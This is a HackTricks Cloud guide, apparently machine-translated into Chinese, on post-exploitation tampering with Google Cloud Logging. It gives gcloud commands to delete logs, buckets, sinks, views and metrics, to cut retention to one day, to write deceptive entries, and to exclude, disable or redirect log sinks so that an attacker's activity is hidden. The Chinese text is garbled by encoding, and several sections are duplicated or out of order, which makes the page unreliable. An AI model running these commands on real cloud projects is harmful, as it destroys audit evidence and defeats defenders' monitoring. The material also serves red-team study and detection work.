# GCP - Logging Post Exploitation

{% hint style="success" %}
å­¦ä¹ å’Œç»ƒä¹  AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œç»ƒä¹  GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡æäº¤ PRs åˆ†äº«é»‘å®¢æŠ€å·§åˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“ã€‚

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹ï¼š

{% content-ref url="../gcp-services/gcp-logging-enum.md" %}
[gcp-logging-enum.md](../gcp-services/gcp-logging-enum.md)
{% endcontent-ref %}

å…¶ä»–å¹²æ‰°ç›‘æ§çš„æ–¹æ³•è¯·æŸ¥çœ‹ï¼š

{% content-ref url="gcp-monitoring-post-exploitation.md" %}
[gcp-monitoring-post-exploitation.md](gcp-monitoring-post-exploitation.md)
{% endcontent-ref %}

### é»˜è®¤æ—¥å¿—è®°å½•

**é»˜è®¤æƒ…å†µä¸‹ï¼Œä»…æ‰§è¡Œè¯»å–æ“ä½œä¸ä¼šè¢«æ•è·ã€‚æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹ Logging Enum éƒ¨åˆ†ã€‚**

### æ·»åŠ ä¾‹å¤–ä¸»ä½“

åœ¨ [https://console.cloud.google.com/iam-admin/audit/allservices](https://console.cloud.google.com/iam-admin/audit/allservices) å’Œ [https://console.cloud.google.com/iam-admin/audit](https://console.cloud.google.com/iam-admin/audit) å¯ä»¥æ·»åŠ ä¸»ä½“ä»¥ä¸ç”Ÿæˆæ—¥å¿—ã€‚æ”»å‡»è€…å¯ä»¥æ»¥ç”¨è¿™ä¸€ç‚¹ä»¥é¿å…è¢«æ•è·ã€‚

### è¯»å–æ—¥å¿— - `logging.logEntries.list`

{% code overflow="wrap" %}
```bash
# Read logs
gcloud logging read "logName=projects/your-project-id/logs/log-id" --limit=10 --format=json

# Everything from a timestamp
gcloud logging read "timestamp >= \"2023-01-01T00:00:00Z\"" --limit=10 --format=json

# Use these options to indicate a different bucket or view to use: --bucket=_Required  --view=_Default
```
{% endcode %}

### `logging.logs.delete`

{% code overflow="wrap" %}
```bash
# Delete all entries from a log in the _Default log bucket - logging.logs.delete
gcloud logging logs delete <log-name>
```
{% endcode %}

### å†™æ—¥å¿— - `logging.logEntries.create`

{% code overflow="wrap" %}
```bash
# Write a log entry to try to disrupt some system
gcloud logging write LOG_NAME "A deceptive log entry" --severity=ERROR
```
{% endcode %}

### `logging.buckets.update`

{% code overflow="wrap" %}
```bash
# Set retention period to 1 day (_Required has a fixed one of 400days)

gcloud logging buckets update bucketlog --location=<location> --description="New description" --retention-days=1
```
{% endcode %}

### `logging.buckets.delete`

### `logging.buckets.delete`

æ­¤æƒé™å…è®¸ç”¨æˆ·åˆ é™¤æ—¥å¿—å­˜å‚¨æ¡¶ã€‚åˆ é™¤æ—¥å¿—å­˜å‚¨æ¡¶ä¼šå¯¼è‡´å­˜å‚¨åœ¨å…¶ä¸­çš„æ‰€æœ‰æ—¥å¿—æ•°æ®æ°¸ä¹…ä¸¢å¤±ã€‚è¿™å¯èƒ½ä¼šè¢«æ”»å‡»è€…ç”¨æ¥æ©ç›–ä»–ä»¬çš„æ´»åŠ¨ã€‚

### `logging.buckets.update`

æ­¤æƒé™å…è®¸ç”¨æˆ·æ›´æ–°æ—¥å¿—å­˜å‚¨æ¡¶çš„é…ç½®ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æƒé™æ›´æ”¹æ—¥å¿—å­˜å‚¨æ¡¶çš„é…ç½®ï¼Œä»¥ä¾¿å‡å°‘æ—¥å¿—è®°å½•æˆ–æ›´æ”¹æ—¥å¿—ä¿ç•™ç­–ç•¥ï¼Œä»è€Œæ©ç›–ä»–ä»¬çš„æ´»åŠ¨ã€‚

### `logging.sinks.delete`

æ­¤æƒé™å…è®¸ç”¨æˆ·åˆ é™¤æ—¥å¿—æ¥æ”¶å™¨ã€‚æ—¥å¿—æ¥æ”¶å™¨ç”¨äºå°†æ—¥å¿—æ•°æ®ä»ä¸€ä¸ªé¡¹ç›®ã€æ–‡ä»¶å¤¹æˆ–ç»„ç»‡è·¯ç”±åˆ°å¦ä¸€ä¸ªä½ç½®ï¼ˆä¾‹å¦‚å¦ä¸€ä¸ªé¡¹ç›®æˆ–å¤–éƒ¨ç³»ç»Ÿï¼‰ã€‚åˆ é™¤æ—¥å¿—æ¥æ”¶å™¨ä¼šå¯¼è‡´æ—¥å¿—æ•°æ®ä¸å†è¢«è·¯ç”±åˆ°é¢„æœŸçš„ä½ç½®ï¼Œä»è€Œå¯èƒ½æ©ç›–æ”»å‡»è€…çš„æ´»åŠ¨ã€‚

### `logging.sinks.update`

æ­¤æƒé™å…è®¸ç”¨æˆ·æ›´æ–°æ—¥å¿—æ¥æ”¶å™¨çš„é…ç½®ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æƒé™æ›´æ”¹æ—¥å¿—æ¥æ”¶å™¨çš„é…ç½®ï¼Œä»¥ä¾¿å°†æ—¥å¿—æ•°æ®è·¯ç”±åˆ°ä»–ä»¬æ§åˆ¶çš„ç³»ç»Ÿï¼Œä»è€Œç›‘è§†æˆ–ç¯¡æ”¹æ—¥å¿—æ•°æ®ã€‚

### `logging.views.delete`

æ­¤æƒé™å…è®¸ç”¨æˆ·åˆ é™¤æ—¥å¿—è§†å›¾ã€‚æ—¥å¿—è§†å›¾ç”¨äºå®šä¹‰ç”¨æˆ·å¯ä»¥æŸ¥çœ‹çš„æ—¥å¿—æ•°æ®çš„å­é›†ã€‚åˆ é™¤æ—¥å¿—è§†å›¾å¯èƒ½ä¼šé™åˆ¶å¯¹æŸäº›æ—¥å¿—æ•°æ®çš„è®¿é—®ï¼Œä»è€Œæ©ç›–æ”»å‡»è€…çš„æ´»åŠ¨ã€‚

### `logging.views.update`

æ­¤æƒé™å…è®¸ç”¨æˆ·æ›´æ–°æ—¥å¿—è§†å›¾çš„é…ç½®ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æƒé™æ›´æ”¹æ—¥å¿—è§†å›¾çš„é…ç½®ï¼Œä»¥ä¾¿éšè—ä»–ä»¬çš„æ´»åŠ¨æˆ–é™åˆ¶å¯¹æŸäº›æ—¥å¿—æ•°æ®çš„è®¿é—®ã€‚
```bash
# Delete log bucket
gcloud logging buckets delete BUCKET_NAME --location=<location>
```
### `logging.links.delete`

{% code overflow="wrap" %}
```bash
# Delete link
gcloud logging links delete <link-id> --bucket <bucket> --location <location>
```
{% endcode %}

### `logging.views.delete`

### åˆ é™¤æ—¥å¿—è§†å›¾

åœ¨æˆåŠŸè·å–å¯¹ Google Cloud é¡¹ç›®çš„è®¿é—®æƒé™åï¼Œæ”»å‡»è€…å¯èƒ½å¸Œæœ›åˆ é™¤æ—¥å¿—è§†å›¾ä»¥éšè—å…¶æ´»åŠ¨ã€‚ä»¥ä¸‹æ˜¯å¦‚ä½•åˆ é™¤æ—¥å¿—è§†å›¾çš„æ­¥éª¤ï¼š

1. **åˆ—å‡ºæ—¥å¿—è§†å›¾**ï¼šé¦–å…ˆï¼Œæ”»å‡»è€…éœ€è¦åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„æ—¥å¿—è§†å›¾ï¼Œä»¥ç¡®å®šè¦åˆ é™¤çš„ç›®æ ‡è§†å›¾ã€‚
    ```bash
    gcloud logging views list --project=[PROJECT_ID]
    ```

2. **åˆ é™¤æ—¥å¿—è§†å›¾**ï¼šä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ é™¤ç‰¹å®šçš„æ—¥å¿—è§†å›¾ã€‚
    ```bash
    gcloud logging views delete [VIEW_ID] --project=[PROJECT_ID]
    ```

### `logging.sinks.delete`

### åˆ é™¤æ—¥å¿—æ¥æ”¶å™¨

æ”»å‡»è€…è¿˜å¯èƒ½å¸Œæœ›åˆ é™¤æ—¥å¿—æ¥æ”¶å™¨ï¼Œä»¥é˜²æ­¢æ—¥å¿—æ•°æ®è¢«ä¼ è¾“åˆ°å¤–éƒ¨å­˜å‚¨æˆ–åˆ†ææœåŠ¡ã€‚ä»¥ä¸‹æ˜¯åˆ é™¤æ—¥å¿—æ¥æ”¶å™¨çš„æ­¥éª¤ï¼š

1. **åˆ—å‡ºæ—¥å¿—æ¥æ”¶å™¨**ï¼šé¦–å…ˆï¼Œæ”»å‡»è€…éœ€è¦åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„æ—¥å¿—æ¥æ”¶å™¨ã€‚
    ```bash
    gcloud logging sinks list --project=[PROJECT_ID]
    ```

2. **åˆ é™¤æ—¥å¿—æ¥æ”¶å™¨**ï¼šä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ é™¤ç‰¹å®šçš„æ—¥å¿—æ¥æ”¶å™¨ã€‚
    ```bash
    gcloud logging sinks delete [SINK_ID] --project=[PROJECT_ID]
    ```

### `logging.metrics.delete`

### åˆ é™¤æ—¥å¿—æŒ‡æ ‡

ä¸ºäº†è¿›ä¸€æ­¥éšè—å…¶æ´»åŠ¨ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ é™¤æ—¥å¿—æŒ‡æ ‡ã€‚ä»¥ä¸‹æ˜¯åˆ é™¤æ—¥å¿—æŒ‡æ ‡çš„æ­¥éª¤ï¼š

1. **åˆ—å‡ºæ—¥å¿—æŒ‡æ ‡**ï¼šé¦–å…ˆï¼Œæ”»å‡»è€…éœ€è¦åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„æ—¥å¿—æŒ‡æ ‡ã€‚
    ```bash
    gcloud logging metrics list --project=[PROJECT_ID]
    ```

2. **åˆ é™¤æ—¥å¿—æŒ‡æ ‡**ï¼šä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ é™¤ç‰¹å®šçš„æ—¥å¿—æŒ‡æ ‡ã€‚
    ```bash
    gcloud logging metrics delete [METRIC_ID] --project=[PROJECT_ID]
    ```
```bash
# Delete a logging view to remove access to anyone using it
gcloud logging views delete <view-id> --bucket=<bucket> --location=global
```
### `logging.views.update`

{% code overflow="wrap" %}
```bash
# Update a logging view to hide data
gcloud logging views update <view-id> --log-filter="resource.type=gce_instance" --bucket=<bucket> --location=global --description="New description for the log view"
```
{% endcode %}

### `logging.logMetrics.update`

{% code overflow="wrap" %}
```bash
# Update log based metrics - logging.logMetrics.update
gcloud logging metrics update <metric-name> --description="Changed metric description" --log-filter="severity>CRITICAL" --project=PROJECT_ID
```
{% endcode %}

### `logging.logMetrics.delete`

### åˆ é™¤æ—¥å¿—æŒ‡æ ‡

åœ¨è¿›è¡Œåæ¸—é€æµ‹è¯•æ—¶ï¼Œæ”»å‡»è€…å¯èƒ½å¸Œæœ›åˆ é™¤æ—¥å¿—æŒ‡æ ‡ä»¥æ©ç›–å…¶æ´»åŠ¨ã€‚ä»¥ä¸‹æ˜¯å¦‚ä½•åˆ é™¤æ—¥å¿—æŒ‡æ ‡çš„æ­¥éª¤ï¼š

1. **åˆ—å‡ºæ—¥å¿—æŒ‡æ ‡**ï¼šé¦–å…ˆï¼Œæ”»å‡»è€…éœ€è¦åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„æ—¥å¿—æŒ‡æ ‡ï¼Œä»¥ç¡®å®šå“ªäº›éœ€è¦åˆ é™¤ã€‚
2. **åˆ é™¤æ—¥å¿—æŒ‡æ ‡**ï¼šä½¿ç”¨é€‚å½“çš„å‘½ä»¤æˆ–APIè°ƒç”¨åˆ é™¤ç›®æ ‡æ—¥å¿—æŒ‡æ ‡ã€‚

```bash
gcloud logging metrics delete METRIC_NAME
```

é€šè¿‡åˆ é™¤æ—¥å¿—æŒ‡æ ‡ï¼Œæ”»å‡»è€…å¯ä»¥å‡å°‘è¢«æ£€æµ‹åˆ°çš„é£é™©ã€‚ç„¶è€Œï¼Œè¿™ç§è¡Œä¸ºå¯èƒ½ä¼šå¼•èµ·ç®¡ç†å‘˜çš„æ³¨æ„ï¼Œå› æ­¤åº”è°¨æ…æ“ä½œã€‚
```bash
# Delete log based metrics - logging.logMetrics.delete
gcloud logging metrics delete <metric-name>
```
### `logging.sinks.delete`

åˆ é™¤ sink å°†åœæ­¢å°†æ—¥å¿—å¯¼å‡ºåˆ°ç›®æ ‡ä½ç½®ã€‚æ­¤æ“ä½œä¸ä¼šåˆ é™¤å·²å¯¼å‡ºçš„æ—¥å¿—æ•°æ®ï¼Œä½†ä¼šåœæ­¢æœªæ¥çš„æ—¥å¿—å¯¼å‡ºã€‚

```bash
gcloud logging sinks delete <sink_name> --project=<project_id>
```

### `logging.sinks.update`

æ›´æ–°ç°æœ‰çš„ sink ä»¥æ›´æ”¹å…¶é…ç½®ï¼Œä¾‹å¦‚ç›®æ ‡ä½ç½®æˆ–è¿‡æ»¤å™¨ã€‚

```bash
gcloud logging sinks update <sink_name> --project=<project_id> --destination=<new_destination>
```

### `logging.sinks.create`

åˆ›å»ºä¸€ä¸ªæ–°çš„ sink ä»¥å¯¼å‡ºæ—¥å¿—åˆ°æŒ‡å®šçš„ç›®æ ‡ä½ç½®ã€‚

```bash
gcloud logging sinks create <sink_name> <destination> --project=<project_id> --log-filter=<filter>
```

### `logging.sinks.list`

åˆ—å‡ºæ‰€æœ‰ç°æœ‰çš„ sinks åŠå…¶é…ç½®ã€‚

```bash
gcloud logging sinks list --project=<project_id>
```

### `logging.sinks.describe`

æè¿°ä¸€ä¸ªç‰¹å®šçš„ sink åŠå…¶é…ç½®ã€‚

```bash
gcloud logging sinks describe <sink_name> --project=<project_id>
```
```bash
# Delete sink - logging.sinks.delete
gcloud logging sinks delete <sink-name>
```
### `logging.sinks.update`

{% code overflow="wrap" %}
```bash
# Disable sink - logging.sinks.update
gcloud logging sinks update <sink-name> --disabled

# Createa filter to exclude attackers logs - logging.sinks.update
gcloud logging sinks update SINK_NAME --add-exclusion="name=exclude-info-logs,filter=severity<INFO"

# Change where the sink is storing the data - logging.sinks.update
gcloud logging sinks update <sink-name> new-destination

# Change the service account to one withuot permissions to write in the destination - logging.sinks.update
gcloud logging sinks update SINK_NAME --custom-writer-identity=attacker-service-account-email --project=PROJECT_ID

# Remove explusions to try to overload with logs - logging.sinks.update
gcloud logging sinks update SINK_NAME --clear-exclusions

# If the sink exports to BigQuery, an attacker might enable or disable the use of partitioned tables, potentially leading to inefficient querying and higher costs. - logging.sinks.update
gcloud logging sinks update SINK_NAME --use-partitioned-tables
gcloud logging sinks update SINK_NAME --no-use-partitioned-tables
```
{% endcode %}

{% hint style="success" %}
å­¦ä¹ å’Œç»ƒä¹  AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œç»ƒä¹  GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡æäº¤ PRs åˆ†äº«é»‘å®¢æŠ€å·§åˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“ã€‚

</details>
{% endhint %}
